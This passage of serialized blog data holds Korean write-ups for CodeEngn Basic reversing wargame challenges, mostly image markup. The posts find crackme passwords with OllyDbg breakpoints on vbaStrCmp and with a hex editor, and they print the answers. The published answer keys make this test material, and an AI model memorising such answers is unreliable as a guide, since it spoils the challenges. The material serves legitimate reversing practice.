class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.18181818181819%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABe0lEQVR42o2Ny0rDUBRF8x3OlGYgKAq1YkvRPLAOnAp+iVUnOhasFhEUpQ9oFBSh4kjoLziwTdVinUQbpE2aNK/7SKJXbjXi0M1msc85bA4zJXDj6dlJPj0tzk8spGJzcTY5w6YS1MkEm5yJDc2mEkMOw1x8gk+PxMaY8u3NwYV0dHV+Ur04vJR2K4WcVNytFL6dk4o5qbh3VopY2jsr7ZRPj68vl1dXGEII1DTXdR3HgZ4HAQCehyBECCEIAT24tmVBAGzLAsADHhUhZD+fZ95rtbt8vtV+btTrsiwrymtTbj61Woqi1Ov3clOWm3Kj0VBVVdN1vd/XdN2ybUJI9bpKP3u6/vH56WPs+34Yhj6mDMMQY4SxjzEOArohkYIgIIRsbW/Tct8wTMMwBwPTNGn4kWGagyjRpaZpvV6v8/bW6agYoWx2jZZdx4a/QhHRnxFChJHjON1u9/Hhod1+gRCub24wmaUML/CCKPzHHMeJoshx3GJmcXRs9AsBrVGkHm8uNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d982fab324c57e4ed3f0343906b044d6/c9b55/0.webp 165w,\n/static/d982fab324c57e4ed3f0343906b044d6/f2908/0.webp 330w,\n/static/d982fab324c57e4ed3f0343906b044d6/062aa/0.webp 504w\"\n              sizes=\"(max-width: 504px) 100vw, 504px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d982fab324c57e4ed3f0343906b044d6/04c57/0.png 165w,\n/static/d982fab324c57e4ed3f0343906b044d6/d9ecf/0.png 330w,\n/static/d982fab324c57e4ed3f0343906b044d6/08115/0.png 504w\"\n            sizes=\"(max-width: 504px) 100vw, 504px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d982fab324c57e4ed3f0343906b044d6/08115/0.png\"\n            alt=\"error\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>올리디버거로 열려고 하니 오류창이 뜨면서 시작한다.\r\n<a href=\"https://support.microsoft.com/ko-kr/help/180071/file-msvbvm50.exe-installs-visual-basic-5.0-run-time-files\">설치경로</a>\r\n올리디버거로 파일 열기에 성공했을 시, 보여지는 entry point는 여기이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 393px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABv0lEQVR42jWPS3PTMBSF5Ti0JHbr+BE7TizJiiXbkp/YaR5NmXSawNRsgB2UrJmu6J6hWbHnd/AvITHc1Zk59zv3HvB8ODz/+H44/FzfPE68D7Orr5vXj7u3T5X4dPbxl3L4reQ3ymalvFn17+f97K6Pdr1k2xtsey+3gLEoZMHIJQjSgaFtbtemeSl1ZAAAXN6xdztnbNieOfYdG1te5CDuTLgjHX0Alqvr1WJGaUb82DCt/X7vOPbJASlfXdd1QChBJAo5IVTwJE8yEafyMb0D8qIo8sQnHGN2oV02TWMaegvTcFaWBcbY8zxCyMTzAhowFvjE70jScYOLJE8F9mMEqTk0szTtyu1PIKBVmnAaBEpfURRVVVVN0/TTSC08XyyX85pMBYKBZQ8fHj7bQ7OFRbZezK+mZIogopQhjMMw5DxijP27XJRlWaSMZRBSwzSaptF1rYVZPH9VlVOf+NhnYQgRjqKIx7EQyflZ9xQv0izlYZj7OBroWlEUnje5UNVjI1pVIrGHtmVZrus6oxHGGEIIER6P3RfdLqjqWV0VIqmJH+mGjqAHAJBPtY33X9ynb+D/nHpKrZBl+a/6Aw4CQ4BFDNweAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f36fdf5f75f0865b53abe7865977aa28/c9b55/1.webp 165w,\n/static/f36fdf5f75f0865b53abe7865977aa28/f2908/1.webp 330w,\n/static/f36fdf5f75f0865b53abe7865977aa28/8efa6/1.webp 393w\"\n              sizes=\"(max-width: 393px) 100vw, 393px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f36fdf5f75f0865b53abe7865977aa28/04c57/1.png 165w,\n/static/f36fdf5f75f0865b53abe7865977aa28/d9ecf/1.png 330w,\n/static/f36fdf5f75f0865b53abe7865977aa28/d72ec/1.png 393w\"\n            sizes=\"(max-width: 393px) 100vw, 393px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f36fdf5f75f0865b53abe7865977aa28/d72ec/1.png\"\n            alt=\"entry point\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>F7을 눌러 처음으로 call하는 함수로 들어갔다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA60lEQVR42g3I206DMAAA0K5NzLjIxtQwRrVcShmXggXK0MEYyZYZk81EEz/A//DF+OF6Hg9gYUJcyjkfd0fr555JxvwoCIK6lmHICHGTJLMsezpVIFS23V4Ikaa8kXKxuAWuG9orJ8uifT/YvzhqKHMpDTxZi3gdRszP8xhjyzRVRbnu+q5ty6oWbVNibIHL+XO52vL89Th+3X0XXtt7bEdolxWndXyIooPjDBiP83mNIJfyo9m8V9VbUZxp8AKen4YHwh9F65N0droYG6aXN0aynBELXekQapOJBoAKgAKACaEBoYqQjpD2P3+CkCNLAB5lTwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/159f9bbb98664a37afdf20f310f231f2/c9b55/2.webp 165w,\n/static/159f9bbb98664a37afdf20f310f231f2/f2908/2.webp 330w,\n/static/159f9bbb98664a37afdf20f310f231f2/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/159f9bbb98664a37afdf20f310f231f2/04c57/2.png 165w,\n/static/159f9bbb98664a37afdf20f310f231f2/d9ecf/2.png 330w,\n/static/159f9bbb98664a37afdf20f310f231f2/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/159f9bbb98664a37afdf20f310f231f2/32056/2.png\"\n            alt=\"mainassem\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>전체 프로그램의 main처럼 보이는 곳에 진입하려는 것과, 모든 함수들이 한데 모여있는 것을 볼 수 있다.</p>\n<p>4줄쯤 위에 비교함수처럼 보이는 함수가 눈에 띈다.\r\n정답은 vbaStrCmp</p>\n<p>해당 프로그램을 실행시키면 다음과 같은 화면이 뜬다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 250px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 72.12121212121212%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACQUlEQVR42mWSTWvbQBCG9f9PpTT0lFBaGieundit5FArOZRgN1AoJBfHxruSZa+l7CraT8nVamUVSW1o0oc57M7wzsC8Y93d3UEIlJSUUiE4wVg075gQHMeqwZiyeo6UUmttJUmSZllpjNZ50aC11nmutS6KoixLY8x+v38hbpMWTZIoiiD0EQrX621hDKNJktCqqvY11b6sWu2+rMqnaDJWHMecsTQj+S9aaLbbCUqFUrwsRZ5znXNT8iwTjAmtRVG0wbXmSgnr9mf86vVucJZ2jtP3H9KRo4bnavxVOY68cNTH43QwUNMb8e4osx05GKrzoeydqpMThbbMms+Ic6HeHmRvDuThoXJdcelyx+ann0S/J7pd0e3Kmx/M/iyGQ/HFlr0z1T1J++dqveFWHGOd89Ko6+utYwe3t3jsbsbjzc33rW0HV1cb2w6m09B1NxCSqhJ5zrSmeU6FYBbB5PGR+r6P0Ha9jjxvhXHs+2sIV8vlCoDVYrHyvJUHA98PfH+FtiFNGE0YY6xeGMZ4NBp1Op3LS7ff7wEA4jhuPNLGFGVZ+2dM62Ox2+0opazBwhgLIdI0bf+yuRDGmFJK/odSSgjB/lKLOee1s/WF1QXOOaUUIcQYo5S2pbYjQuhp7B+xlJIQ8q1hMplMp1MAQBAEnPMsy+bz+WQyoZQqpSCESZK8nIwQur+/n81my+USAOB5HoQwDEOEEABgsVigBgDAs8mEEM75w8MDxpgQghuiKGoXGYZhW4qiKAzD+hz/4Tc9qfYEpkMGiwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/929a54a94db528f3789488299638c9e5/c9b55/3.webp 165w,\n/static/929a54a94db528f3789488299638c9e5/1e0be/3.webp 250w\"\n              sizes=\"(max-width: 250px) 100vw, 250px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/929a54a94db528f3789488299638c9e5/04c57/3.png 165w,\n/static/929a54a94db528f3789488299638c9e5/63868/3.png 250w\"\n            sizes=\"(max-width: 250px) 100vw, 250px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/929a54a94db528f3789488299638c9e5/63868/3.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Regcode칸에 아무 문자열이나 입력하면 다음과 같은 오류창이 뜬다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 270px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.3939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABvElEQVR42pWO207bQBCG9w0RqGqlqqpaJJwKSGjUBkEgspGSlkfhFXrRihdI7CSkOeAlcczKjvfk3bUTEVy7iukBlXLBr+/inxn9MwOKDV07OSqcVHfqNc04fHtc0fTDLaP6+qC8XiqsFbX1vcI/rJW0VwfvX+7vgd2GvtPQt+u10mdDM6pbRrX4SX9XP96sVV5Uis8/7D7kWXl7s7b/5ugjgFMnoMSnxGfUJ3hGsIexT3BACWaUcPYHfM8HjAaMglDKLMt+3Nwk83n2RIFQiiRJnLOz5ulpAG0uhJJRGHK6EqGMc84ZZUJKTAjGJAzF7fI2y9I0TYFQKlkuz8vlLxsbntmaIuS6iDMGIUQIjUYjaNtXcOz5vuM4o+HQ8/w8nF8W+dt0PMamuWqk6RPeFkrlkV+ZNNfK3JW/zb3R3+1gFgSLxUJJGUkZPyIhBOdcKhVF0Z1XSsVxDFyEQiEoY4zz/0IodV2XUjoc9lst6xohjHF/MGCcA382m8dzJVWkoofEUSxCAW3oe17Han37en55aaNrt21ZcRSDi+FgPHVsZwIfwZ5MrItOs21avW7ne8/stptts9vvXU2dn01XYMW1qsF5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/195c785fc5ead99e9b5ad89551a67f8b/c9b55/4.webp 165w,\n/static/195c785fc5ead99e9b5ad89551a67f8b/3e767/4.webp 270w\"\n              sizes=\"(max-width: 270px) 100vw, 270px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/195c785fc5ead99e9b5ad89551a67f8b/04c57/4.png 165w,\n/static/195c785fc5ead99e9b5ad89551a67f8b/01bf6/4.png 270w\"\n            sizes=\"(max-width: 270px) 100vw, 270px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/195c785fc5ead99e9b5ad89551a67f8b/01bf6/4.png\"\n            alt=\"crackme2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>내친김에 패스워드까지 알아내 보도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.151515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAp0lEQVR42j2KXQqCQBgAP4UEKUWT1DVl/Vl1/Vl1UUESERKkC9gheuoEnT2EaJ6GYeDVdi3CHvFHPuEPSceYuITSjDc8iWPGGMZY2THm+d517TAMaZLq+lmWZdi2J2NtEPnLbXHfjTMHKLPd2ItSEoYBQsg0LVVVDtKxrnlRFJRSEhFN0wRBgHV95DlnVXnRDbufnJ6iynLKq2KeAGA/fkgAu4viv8AXtH0V6MuBPtUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/cb7f61f86bbc93db88906e6f3df6d774/c9b55/5.webp 165w,\n/static/cb7f61f86bbc93db88906e6f3df6d774/f2908/5.webp 330w,\n/static/cb7f61f86bbc93db88906e6f3df6d774/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/cb7f61f86bbc93db88906e6f3df6d774/04c57/5.png 165w,\n/static/cb7f61f86bbc93db88906e6f3df6d774/d9ecf/5.png 330w,\n/static/cb7f61f86bbc93db88906e6f3df6d774/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/cb7f61f86bbc93db88906e6f3df6d774/32056/5.png\"\n            alt=\"findpw\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>앞에서 찾은 비교함수 부분에 breakpoint를 걸고 프로그램을 실행시킨다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 266px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADEklEQVR42m2STW/TWBSG/SdYIASrkfgFjFD5lAqDWqCZxnZpYAQDVGIBixFo1EGIggQsKOyQEIjvFQjN0CLx0UDUlKbutNRO65jWNUrdpGnutZPY8bXje2M3iVE/ACHx6FkcHek9Z/NSTfuam5lQU1vrttCyu+iD20It239v3U237Wg/0NTW0hRq+XX/3m9uad2z9cC+HeGD6zZuoDrPnOrq+edoT/fxS91/XDh34lJ35PzZP3u6uy6fP3bx79Bfp+hzp3edPLy768iqO09EWk+fjFw4u37zL9Tth/dext73vx948fZ1/7voMP/x5buBaCIxOiUkhImRSZ5bVuAmhdGpNUeECWF25rf9LZQgTDjIUBQ5n80Vod5oNGxURMgJgqDRaAQ/o16vB0HQGYlQA1FOlusAWrlFO7dop9OmmLJzi2UIS+k5I5M1NK0kyyYvmIWCkc8vq6rFikvCDE09ffb/gzvBtSuV3l5yvbf6/Dl+/cZ9/BDfvUMePSG3bpF//8OJROXmTXL3Nr5/373Ri69ecaXZWmeEoYYTHHZ9ccrs64fRKPg4ob96BRKJQiymRaMwHtfjcT2ZLA4OFiCwTdMGAAFgkqpPswzFjXK1mo+xk8mg6elyLodEUZ+e1gQB8DzkuIWhIXVyMisI2TzIaxqwLNOyTH9pLTyKXbfvRV88Hhsaig0OxgDIiqLw6dOUIIzlcqrnVRynXKlY5a+Ypun7K+ERjvM8b25ubmZGnp1VVHUeAKgon+fn5yVJglCr1erVatXz/KWlJd/3EUKGYXwPr648z/N93/M8QojruuVyGWNsrYAQMk1T1/VSqWRZ1g+fa7Ua1LSxsbFUKsXzvCRJ+Xw+m80ihBzHkSRJURRCyMLCQrFYXD20Fv4w/IEQkslkxsfHeZ5PJpOiKKqqmk6nIYQAgGQyKcuyruuKokAIDcMoFAoY43aGpsRUKggChBDGmBCCV3AchxDiOA5CyF3Btm2E0Grn1hp2OEI1793DHuqgWYZm2W8yHSzNMkzHDwPTwYYZOszQ7XSY7Ty0cdOmL4Dsmqi9lTtWAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/53c5691028fa7311005760de086d953c/c9b55/6.webp 165w,\n/static/53c5691028fa7311005760de086d953c/d8e38/6.webp 266w\"\n              sizes=\"(max-width: 266px) 100vw, 266px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/53c5691028fa7311005760de086d953c/04c57/6.png 165w,\n/static/53c5691028fa7311005760de086d953c/b4ffe/6.png 266w\"\n            sizes=\"(max-width: 266px) 100vw, 266px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/53c5691028fa7311005760de086d953c/b4ffe/6.png\"\n            alt=\"crackme3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>프로그램이 뜨면 아무 문자열이나 입력시켜 주고 확인버튼을 누르면 Stack이 다음과 같이 쌓여 있는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 535px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 9.696969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAZUlEQVR42mOoqSl3dEzR043R1Y1SVIo1MoyVlQnQ1Iw2No5XUvTn5rbn5XMQEHAUFXUWF3cWFHDk5XEQFnYWEnJiYbFl0NbSkpBQMjDUMTbSERGVEhLk4uHhEBTk5ufnYmRiwA8A6dwOQ3z7QswAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/da5e030170ede5b2ca80ba241555138a/c9b55/7.webp 165w,\n/static/da5e030170ede5b2ca80ba241555138a/f2908/7.webp 330w,\n/static/da5e030170ede5b2ca80ba241555138a/e0c9f/7.webp 535w\"\n              sizes=\"(max-width: 535px) 100vw, 535px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/da5e030170ede5b2ca80ba241555138a/04c57/7.png 165w,\n/static/da5e030170ede5b2ca80ba241555138a/d9ecf/7.png 330w,\n/static/da5e030170ede5b2ca80ba241555138a/b5245/7.png 535w\"\n            sizes=\"(max-width: 535px) 100vw, 535px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/da5e030170ede5b2ca80ba241555138a/b5245/7.png\"\n            alt=\"stack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>앞에서 입력한 문자열과는 다른 패스워드로 추정되는 문자열이 있다.</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"2c8a1f2b-5580-5592-911c-635d1b40d0c3","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-03/","title":"CodeEngn Basic 03","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/43d853c2a17da38fdd184dd25c65043d/ec279/0.png","srcSet":"/static/43d853c2a17da38fdd184dd25c65043d/e24d6/0.png 87w,\n/static/43d853c2a17da38fdd184dd25c65043d/6236b/0.png 174w,\n/static/43d853c2a17da38fdd184dd25c65043d/ec279/0.png 348w","sizes":"(min-width: 348px) 348px, 100vw"},"sources":[{"srcSet":"/static/43d853c2a17da38fdd184dd25c65043d/1bb2f/0.webp 87w,\n/static/43d853c2a17da38fdd184dd25c65043d/308d3/0.webp 174w,\n/static/43d853c2a17da38fdd184dd25c65043d/fc3fc/0.webp 348w","type":"image/webp","sizes":"(min-width: 348px) 348px, 100vw"}]},"width":660,"height":400.1724137931035}}}},"body":"<p>패스워드로 인증하는 실행파일이 손상되어 실행이 안되는 문제가 생겼다. 패스워드가 무엇인지 분석하시오</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 348px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.06060606060606%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABR0lEQVR42o2OzU7CQBSF+17q0p0u0RW6UBMS3PkkvIlrZYrE/g0o2E6LLf1BKkk7g9Z2SkzAMmMK0ejC4JeTe2/Ozcm9QuWivlc/2a5Wdo4P/6mto4Pds+r++alw04UtqIKOCjRZ7KhiRwVQKaXJACprp6nJP3WtSu07eCleCZxzzhifzxljxUexLArGGGcrk/OiWC4WC/4btlpFU1KGQ1G8rdWCLhSh1JbauqGDVlOBit7vyYoqaVKEcfKWpDSNcPyaJDSnnPMJjsswNs1+o/H+Mo1w7LrO0HGCYGQ7tu+63shFlukNHWSayHoYPNq+502eJ+VlggW+Gfbn23meU0pplq37N9lXzcopT9OUEEKmJRiTLE398ZNAN5Fl2Ww2i6IoCAJD1wEA4zA0EXJ8T4hwvFExwePnUEeGYaL7fk9HhjWwDHvwCR5awfk9RCF0AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/43d853c2a17da38fdd184dd25c65043d/c9b55/0.webp 165w,\n/static/43d853c2a17da38fdd184dd25c65043d/f2908/0.webp 330w,\n/static/43d853c2a17da38fdd184dd25c65043d/db06a/0.webp 348w\"\n              sizes=\"(max-width: 348px) 100vw, 348px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/43d853c2a17da38fdd184dd25c65043d/04c57/0.png 165w,\n/static/43d853c2a17da38fdd184dd25c65043d/d9ecf/0.png 330w,\n/static/43d853c2a17da38fdd184dd25c65043d/34ea4/0.png 348w\"\n            sizes=\"(max-width: 348px) 100vw, 348px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/43d853c2a17da38fdd184dd25c65043d/34ea4/0.png\"\n            alt=\"error\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>올리디버거로 열면 다음과 같은 오류가 뜬다.\r\nHex editor로 열어보도록 한다. 본인은 010 editor를 사용하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 304px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.81818181818181%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACvklEQVR42jWRuW4bRwCG+arug7xMiqRw7MJFUqYyYCSAaweQaIqySIrc2Zmd+75nlksCCmgrD/DhP76VFAZjgTHDRFIiKFWMGwCmUuYYW4o1pdm7EnzJeY6he5dLOceUQ/ArKd00STwJQg0lEmPNuRsBjbHntOR8yeWa0pLSUso15UtK51KuIaQbzJmeJoEQQ5PAE8dYEqpPJ5RS974GX0OcrS3elhi7993aktIc4yusEGIQEoT4hOg0cfo/HGNPqf2o7d2tdgjN+3Kr/QOWwmNs8KQwMZQaQgwhdhhIjDNjjhCjVObcK5m0SkqXaVJSphjLDbbac2Ep04xpTiVjCmNxfB5rPW8fduv19nSattv97ul5c789nNB+P1Bqcq7e+xVGEiE1jhxCMQIOoZywOR1JiH1CkrNAiVmv95uvz7tv4OFxYNx7318Pc9YJaRiTnCuCKSGMMjkC2PocQ44hWesfNk+bzbdWZyENhFhrl1K+JSNoEHIImv2enY6S0gSRez5Q7+fN+rjdAi0DhvxxvYVQEpLv7o4+XEL47tmaoxSHEawJ3RHyyNhOmxMlj71rNN5jNtwD93V0d4NbP+3A8O9u9+V61Tk778PKmt+5eM/5ey7eCvFWyndKv0Po19b/YeiXNfr008eXnz9e3/z18tvfn18uH0r5Y1n+zBl4n1fOSs4Z50RILgUVgmktMYat1VZzKdmls3ZN+5ZyLSWnGHqvKaVbMsF2GCQYOBj1CCQACiF72BPnujFnZ8/OLdZ0a7r3izGLUd25i/ffN2ulGRP0drLgjHEuhdQQotZ6q3Nvc+tLyb2U3vu51XPJbZ6X17fxpAGQw8AGIEfAx1FCZA6HyfuuVdW6ajMLUaQs1nalmhDZ2vnVs1aaYH4zTAUjjBAhhB4BrLXn1Epupc4x1BRrrXPOPYbS2jmlHLz/D4FgZoRgi6xAAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4a092413a0fc25a40914b251c259a59c/c9b55/1.webp 165w,\n/static/4a092413a0fc25a40914b251c259a59c/e6f1a/1.webp 304w\"\n              sizes=\"(max-width: 304px) 100vw, 304px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4a092413a0fc25a40914b251c259a59c/04c57/1.png 165w,\n/static/4a092413a0fc25a40914b251c259a59c/c1724/1.png 304w\"\n            sizes=\"(max-width: 304px) 100vw, 304px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4a092413a0fc25a40914b251c259a59c/c1724/1.png\"\n            alt=\"010editor\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>쭉쭉 내리다 보면 해냈다는 메시지와 함께 플래그를 확인할 수 있다.\r\n정답은 JK3FJZh</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"0d33348d-bb07-57b1-92fe-ad724de4c913","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-02/","title":"CodeEngn Basic 02","readingTime":{"text":"1 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/2b8c99388abe677e18f78a393128f4ff/3d1e7/0.png","srcSet":"/static/2b8c99388abe677e18f78a393128f4ff/309ff/0.png 73w,\n/static/2b8c99388abe677e18f78a393128f4ff/cb8d6/0.png 145w,\n/static/2b8c99388abe677e18f78a393128f4ff/3d1e7/0.png 290w","sizes":"(min-width: 290px) 290px, 100vw"},"sources":[{"srcSet":"/static/2b8c99388abe677e18f78a393128f4ff/cc974/0.webp 73w,\n/static/2b8c99388abe677e18f78a393128f4ff/06d2e/0.webp 145w,\n/static/2b8c99388abe677e18f78a393128f4ff/7ccff/0.webp 290w","type":"image/webp","sizes":"(min-width: 290px) 290px, 100vw"}]},"width":660,"height":400.55172413793105}}}},"body":"<p>이 프로그램은 디버거 프로그램을 탐지하는 기능을 갖고 있다. 디버거를 탐지하는 함수의 이름은 무엇인가</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 290px; \"\n    >\n      <span\n    